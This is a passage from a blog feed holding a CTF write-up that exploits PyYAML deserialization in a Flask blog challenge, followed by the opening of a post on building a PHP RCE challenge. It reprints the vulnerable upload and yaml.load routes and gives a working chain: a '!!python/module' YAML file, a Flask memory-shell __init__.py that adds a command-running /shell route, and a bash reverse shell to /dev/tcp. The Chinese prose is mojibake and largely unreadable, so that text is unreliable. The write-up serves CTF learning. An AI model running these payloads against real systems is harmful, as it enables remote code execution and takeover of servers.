class="literal">False</span>  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/writeBlog&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeblog</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;writeBlog.html&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        title = request.form.get(<span class="string">&quot;title&quot;</span>)  </span><br><span class="line">        text = request.form.get(<span class="string">&quot;text&quot;</span>)  </span><br><span class="line">        username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">        create_time = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)  </span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">        blog = Blog(title=title, text=text, create_time=create_time, user_id=user.<span class="built_in">id</span>)  </span><br><span class="line">        db.session.add(blog)  </span><br><span class="line">        db.session.commit()  </span><br><span class="line">        blog = Blog.query.<span class="built_in">filter</span>(Blog.create_time == create_time).first()  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;blogSuccess.html&#x27;</span>, title=title, <span class="built_in">id</span>=blog.<span class="built_in">id</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/imgUpload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imgUpload</span>():  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        file = request.files.get(<span class="string">&#x27;editormd-image-file&#x27;</span>)  </span><br><span class="line">        fileName = file.filename.replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">        filePath = os.path.join(<span class="string">&quot;static/upload/&quot;</span>, fileName)  </span><br><span class="line">        file.save(filePath)  </span><br><span class="line">        <span class="keyword">return</span> &#123;  </span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">1</span>,  </span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ä¸Šä¼ æˆåŠŸ!&#x27;</span>,  </span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>: <span class="string">&quot;/&quot;</span> + filePath  </span><br><span class="line">        &#125;  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">        <span class="keyword">return</span> &#123;  </span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">0</span>,  </span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ä¸Šä¼ å¤±è´¥&#x27;</span>  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/showBlog/&lt;id&gt;&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showBlog</span>(<span class="params"><span class="built_in">id</span></span>):  </span><br><span class="line">    blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">    comment = Comment.query.<span class="built_in">filter</span>(Comment.blog_id == blog.<span class="built_in">id</span>)  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;showBlog.html&quot;</span>, blog=blog, comment=comment)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/blogAll&quot;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blogAll</span>():  </span><br><span class="line">    blogList = Blog.query.order_by(Blog.create_time.desc()).<span class="built_in">all</span>()  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;blogAll.html&#x27;</span>, blogList=blogList)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/update/&lt;id&gt;&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params"><span class="built_in">id</span></span>):  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:  </span><br><span class="line">        blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;updateBlog.html&#x27;</span>, blog=blog)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        <span class="built_in">id</span> = request.form.get(<span class="string">&quot;id&quot;</span>)  </span><br><span class="line">        title = request.form.get(<span class="string">&quot;title&quot;</span>)  </span><br><span class="line">        text = request.form.get(<span class="string">&quot;text&quot;</span>)  </span><br><span class="line">        blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">        blog.title = title  </span><br><span class="line">        blog.text = text  </span><br><span class="line">        db.session.commit()  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;blogSuccess.html&#x27;</span>, title=title, <span class="built_in">id</span>=<span class="built_in">id</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/delete/&lt;id&gt;&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):  </span><br><span class="line">    blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">    db.session.delete(blog)  </span><br><span class="line">    db.session.commit()  </span><br><span class="line">    <span class="keyword">return</span> &#123;  </span><br><span class="line">        <span class="string">&#x27;state&#x27;</span>: <span class="literal">True</span>,  </span><br><span class="line">        <span class="string">&#x27;msg&#x27;</span>: <span class="string">&quot;åˆ é™¤æˆåŠŸï¼&quot;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/myBlog&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myBlog</span>():  </span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">    user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">    blogList = Blog.query.<span class="built_in">filter</span>(Blog.user_id == user.<span class="built_in">id</span>).order_by(Blog.create_time.desc()).<span class="built_in">all</span>()  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;myBlog.html&quot;</span>, blogList=blogList)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/comment&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">comment</span>():  </span><br><span class="line">    text = request.values.get(<span class="string">&#x27;text&#x27;</span>)  </span><br><span class="line">    blogId = request.values.get(<span class="string">&#x27;blogId&#x27;</span>)  </span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">    create_time = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)  </span><br><span class="line">    user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">    comment = Comment(text=text, create_time=create_time, blog_id=blogId, user_id=user.<span class="built_in">id</span>)  </span><br><span class="line">    db.session.add(comment)  </span><br><span class="line">    db.session.commit()  </span><br><span class="line">    <span class="keyword">return</span> &#123;  </span><br><span class="line">        <span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>,  </span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;è¯„è®ºæˆåŠŸï¼&#x27;</span>,  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/myComment&#x27;</span></span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myComment</span>():  </span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">    user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">    commentList = Comment.query.<span class="built_in">filter</span>(Comment.user_id == user.<span class="built_in">id</span>).order_by(Comment.create_time.desc()).<span class="built_in">all</span>()  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;myComment.html&quot;</span>, commentList=commentList)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/deleteCom/&lt;id&gt;&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deleteCom</span>(<span class="params"><span class="built_in">id</span></span>):  </span><br><span class="line">    com = Comment.query.<span class="built_in">filter</span>(Comment.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">    db.session.delete(com)  </span><br><span class="line">    db.session.commit()  </span><br><span class="line">    <span class="keyword">return</span> &#123;  </span><br><span class="line">        <span class="string">&#x27;state&#x27;</span>: <span class="literal">True</span>,  </span><br><span class="line">        <span class="string">&#x27;msg&#x27;</span>: <span class="string">&quot;åˆ é™¤æˆåŠŸï¼&quot;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/saying&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@admin_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Saying</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):  </span><br><span class="line">        file = request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>).replace(<span class="string">&#x27;..\\&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>)  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                f = f.read()  </span><br><span class="line">                <span class="keyword">if</span> waf(f):  </span><br><span class="line">                    <span class="built_in">print</span>(yaml.load(f, Loader=Loader))  </span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼šå½“ä½ çœ‹åˆ°è¿™å¥è¯æ—¶ï¼Œè¿˜æ²¡æœ‰æ‹¿åˆ°flagï¼Œé‚£å°±èµ¶ç´§é‡å¼€ç¯å¢ƒå§&#x27;</span>)  </span><br><span class="line">                <span class="keyword">else</span>:  </span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼šä½ è¯´å¾—ä¸å¯¹&#x27;</span>)  </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼š&#x27;</span>+<span class="built_in">str</span>(e))  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;view/jojo.yaml&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            sayings = yaml.load(f, Loader=Loader)  </span><br><span class="line">            saying = random.choice(sayings)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=saying)</span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹åˆ°blog.pyçš„ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„è·¯ç”±</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/imgUpload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imgUpload</span>():  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        file = request.files.get(<span class="string">&#x27;editormd-image-file&#x27;</span>)  </span><br><span class="line">        fileName = file.filename.replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">        filePath = os.path.join(<span class="string">&quot;static/upload/&quot;</span>, fileName)  </span><br><span class="line">        file.save(filePath)  </span><br><span class="line">        <span class="keyword">return</span> &#123;  </span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">1</span>,  </span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ä¸Šä¼ æˆåŠŸ!&#x27;</span>,  </span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>: <span class="string">&quot;/&quot;</span> + filePath  </span><br><span class="line">        &#125;  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">        <span class="keyword">return</span> &#123;  </span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">0</span>,  </span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ä¸Šä¼ å¤±è´¥&#x27;</span>  </span><br><span class="line">        &#125;  </span><br></pre></td></tr></table></figure><p><strong>yamlååºåˆ—åŒ–ç»•è¿‡</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/saying&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@admin_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Saying</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):  </span><br><span class="line">        file = request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>).replace(<span class="string">&#x27;..\\&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>)  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                f = f.read()  </span><br><span class="line">                <span class="keyword">if</span> waf(f):  </span><br><span class="line">                    <span class="built_in">print</span>(yaml.load(f, Loader=Loader))  </span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼šå½“ä½ çœ‹åˆ°è¿™å¥è¯æ—¶ï¼Œè¿˜æ²¡æœ‰æ‹¿åˆ°flagï¼Œé‚£å°±èµ¶ç´§é‡å¼€ç¯å¢ƒå§&#x27;</span>)  </span><br><span class="line">                <span class="keyword">else</span>:  </span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼šä½ è¯´å¾—ä¸å¯¹&#x27;</span>)  </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼š&#x27;</span>+<span class="built_in">str</span>(e))  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;view/jojo.yaml&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            sayings = yaml.load(f, Loader=Loader)  </span><br><span class="line">            saying = random.choice(sayings)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=saying)</span><br></pre></td></tr></table></figure><p>æˆ‘ç¬¬ä¸€æ¬¡åšPYyamlååºåˆ—åŒ–ï¼Œå…ˆå­¦ä¹ ä¸€ä¸‹</p><blockquote><p>yaml.dump()ï¼šå°†ä¸€ä¸ªPythonå¯¹è±¡åºåˆ—åŒ–ç”Ÿæˆä¸ºyamlæ–‡æ¡£ã€‚<br>yaml.load()ï¼šå°†ä¸€ä¸ªyamlæ–‡æ¡£ååºåˆ—åŒ–ä¸ºä¸€ä¸ªPythonå¯¹è±¡ã€‚<br><strong>æ£€æµ‹æ–¹æ³•</strong>ï¼š<br>Pythonä»£ç ä¸­æ˜¯å¦åŒ…å«â€œimport yamlâ€ï¼Œè‹¥åŒ…å«åˆ™è¿›ä¸€æ­¥æ’æŸ¥æ˜¯å¦è°ƒç”¨yaml.load()ä¸”å‚æ•°æ˜¯å¯æ§çš„ã€‚<br><strong>é˜²å¾¡æ–¹æ³•</strong><br>ä½¿ç”¨å®‰å…¨å‡½æ•°yaml.safe_load()æ›¿ä»£yaml.load()å³å¯è§£å†³Pyyamlååºåˆ—åŒ–æ¼æ´ã€‚</p></blockquote><p>ç„¶åæ˜¯åˆ©ç”¨yamlæ–‡ä»¶è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯è¿™ä¸ªé¢˜pythonä¸­çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°éƒ½ç»™banäº†ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥åœ¨yamlè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡yamlæ¥å¯¼å…¥å…¶å®ƒæ¨¡å—æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br>æœ¬é¢˜é€šè¿‡<strong>python&#x2F;module</strong>æ ‡ç­¾æ¥å®ç°ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªç‚¹å°±æ˜¯ä¸Šä¼ çš„æ–‡ä»¶å’Œæ‰§è¡Œçš„æ–‡ä»¶ä¸åœ¨åŒä¸€ç›®å½•ï¼Œé€šè¿‡å‡ºé¢˜äººçš„wpå¯çŸ¥ç›®å½•å±‚çº§ä¸º&#x2F;static&#x2F;upload&#x2F;ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå½“ç„¶é€šè¿‡å‰é¢çš„æµ‹è¯•ä¹Ÿå¯çŒœå‡ºæ¥ï¼Œè¿™ä¸ªæ—¶å€™yamlæ–‡ä»¶å†…å®¹å°±å¯å†™æˆ<code>!!python/module:static.upload</code>ï¼Œä»è€ŒåŠ è½½å‘½ä»¤æ‰§è¡Œçš„æ¨¡å—ï¼Œè¿™æ ·å†™ä½ è¦åŠ è½½çš„æ¨¡å—æ–‡ä»¶åå¿…é¡»å‘½åä¸º<code>__init__.py</code>å¦åˆ™å°±è¦åœ¨yamlæ–‡ä»¶ä¸­å†™å…¥ä½ è¦åŠ è½½çš„æ¨¡å—æ–‡ä»¶å<br><strong>å…ˆæŠŠä¸Šé¢å…³äºmoduleæ ‡ç­¾åˆ©ç”¨è¿‡ç¨‹è§£é‡Šä¸€ä¸‹ï¼Œæ„Ÿè§‰é€»è¾‘æœ‰äº›æ··ä¹±äº†ï¼Œè‡ªå·±æ²¡å¤ªç†è§£</strong></p><blockquote><p>å‡å¦‚æœ‰ä¸ªyaml_test.pyæ–‡ä»¶ä¸º<br><code>import os </code><br><code>os.system(&#39;mate-calc&#39;)</code><br>åœ¨å¦ä¸€æ–‡ä»¶simple.pyä¸­ï¼Œä¾æ¬¡è¿è¡Œä»¥ä¸‹loadä»£ç <br><code>import yaml </code><br><code>yaml.load(&quot;!!python/module:yaml_test&quot; )  </code>#expæ–¹æ³•æ˜¯éšæ„å†™çš„ï¼Œæ˜¯ä¸å­˜åœ¨çš„ï¼Œä½†å¿…é¡»è¦æœ‰ï¼Œå› ä¸ºè¿™æ˜¯å‘½åè§„åˆ™ï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼Œä¸»è¦æ˜¯æ–‡ä»¶åyaml_testè¦å†™å¯¹<code>  </code>yaml.load(â€œ!!python&#x2F;object:yaml_test.expâ€ )<br><code>yaml.load(&quot;!!python/name:yaml_test.exp&quot; )</code><br>è¿™å‡ æ¡å‘½ä»¤éƒ½èƒ½æ‰“å¼€è®¡ç®—å™¨ï¼Œè¿™é‡Œæˆ‘è‡ªå·±æ²¡åšæµ‹è¯•ï¼Œyamlç‰ˆæœ¬å¤§äº5.1å°±è¦åŠ ä¸ªLoaderå‚æ•°å¦åˆ™æ‰§è¡Œyaml.loadå°±ä¼šæŠ¥é”™</p></blockquote><p>ä¸Šé¢æ˜¯è¦æ±‚åŒä¸€ç›®å½•ï¼Œä¸åœ¨åŒä¸€ç›®å½•å°±æ˜¯æœ¬é¢˜æ‰€ç”¨æ–¹æ³•ï¼Œç¨å¾®æ”¹ä¸€ä¸‹yamlæ–‡ä»¶æ–‡ä»¶å°±è¡Œï¼Œè¿™æ ·å°±æ¯”è¾ƒå¥½ç†è§£ä¸ºä»€ä¹ˆæ„é€ yamlæ–‡ä»¶å’Œ__init__.pyæ–‡ä»¶äº†<br>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ __init__.pyæ–‡ä»¶è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå‡ºé¢˜äººè‡ªå·±çš„wpä½¿ç”¨çš„å†…å­˜é©¬æœ¬äººè¿˜æ²¡å¤ªäº†è§£æ‰€ä»¥ç›´æ¥ç”¨æ¥æ‰“ä¸€ä¸‹ï¼Œå°±ä¸è§£é‡Šæ„é€ äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *  </span><br><span class="line"><span class="built_in">eval</span>(  </span><br><span class="line">    <span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;)).read())&quot;</span>,  </span><br><span class="line">   &#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>: url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>], <span class="string">&#x27;app&#x27;</span>: url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)  </span><br><span class="line"><span class="comment"># ç”Ÿæˆä¸€ä¸ªshellè·¯ç”±ï¼Œå‚æ•°ä¸ºshell</span></span><br></pre></td></tr></table></figure><p>å…ˆå°†__init__.pyä¼ å…¥<br><img src="https://s1.ax1x.com/2022/12/27/zz0vcR.png" alt="zz0vcR.png"><br>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯å›¾ç‰‡ä¸Šä¼ è·¯ç”±åœ¨ä¸‹é¢è¿™é‡Œï¼ŒæŠ“æœ¬åœ°ä¸Šä¼ çš„é‚£ä¸ªåŒ…å°±è¡Œï¼Œå¾ˆå‚»çš„ä¸€ä¸ªé—®é¢˜è‡ªå·±åœ¨è¿™é‡Œå¡äº†åŠå¤©ï¼Œå¾—æ„Ÿè°¢ä¸€ä¸‹<a href="https://www.lengf233.top/">lengf</a>å¸ˆå‚…ç»™æˆ‘è§£ç­”è¿™ä¹ˆå‚»çš„é—®é¢˜<br><img src="https://s1.ax1x.com/2022/12/27/zz0xj1.png" alt="zz0xj1.png"><br>ç„¶åä¸Šä¼ yamlæ–‡ä»¶<br><img src="https://s1.ax1x.com/2022/12/27/zz0X9J.png" alt="zz0X9J.png"><br>æœ€åè®¿é—®<code>blog/saying?path=static/upload/poc1.yaml</code>ç”Ÿæˆè·¯ç”±ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br><img src="https://s1.ax1x.com/2022/12/27/zz0Lh4.png" alt="zz0Lh4.png"><br>ç¬¬äºŒä¸ªæ˜¯åå¼¹shellï¼Œæˆ‘è¿™é‡Œç”¨çš„bashåå¼¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/xxx/2333 0&gt;&amp;1&quot;&#x27;)</span><br></pre></td></tr></table></figure><p>æ”¾å…¥__init__.pyç”Ÿæˆè·¯ç”±æ—¶ä¼šæ‰§è¡Œï¼Œå³å¯åå¼¹æˆåŠŸ<br><img src="https://s1.ax1x.com/2022/12/27/zz0j39.png" alt="zz0j39.png"><br>æœ‰æ—¶é—´å†æ²‰æ·€ä¸€ä¸‹ï¼Œç†è§£çš„ä¸æ˜¯å¾ˆé€å½»<br>å‚è€ƒï¼š<br><a href="https://pysnow.cn/archives/566/">å‡ºé¢˜äºº</a><br><a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#pythonmodule">https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#pythonmodule</a><br><a href="https://www.cnblogs.com/damoxilai/p/16707055.html">https://www.cnblogs.com/damoxilai/p/16707055.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>7å­—ç¬¦rceé¢˜ç›®æ­å»º</title>
      <link href="/2022/12/7%E5%AD%97%E7%AC%A6rce%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/"/>
      <url>/2022/12/7%E5%AD%97%E7%AC%A6rce%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p><strong>æ­å»ºè¿™ä¸ªé¢˜ç›®æœ¬æ„å°±æ˜¯æƒ³å­¦ä¹ ä¸€ä¸‹dockerfileå’Œdocker-compose.ymlæ–‡ä»¶çš„ä½¿ç”¨ï¼ŒåŸç†è®²çš„ä¸é€å½»ï¼Œä¸»è¦è®°å½•ä¸€ä¸‹æ“ä½œ</strong></p><p>é¦–å…ˆåœ¨æœ¬åœ°æŠŠè§£é¢˜çš„æºç å†™å®Œï¼Œå†ä¸Šä¼ åˆ°æœåŠ¡å™¨<br><img src="https://s1.ax1x.com/2022/12/19/zLikCD.png" alt="zLikCD.png"><br>filesä¸‹æ”¾çš„æ˜¯flag.phpå’Œindex.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])&lt;=<span class="number">7</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">   <span class="keyword">echo</span> <span 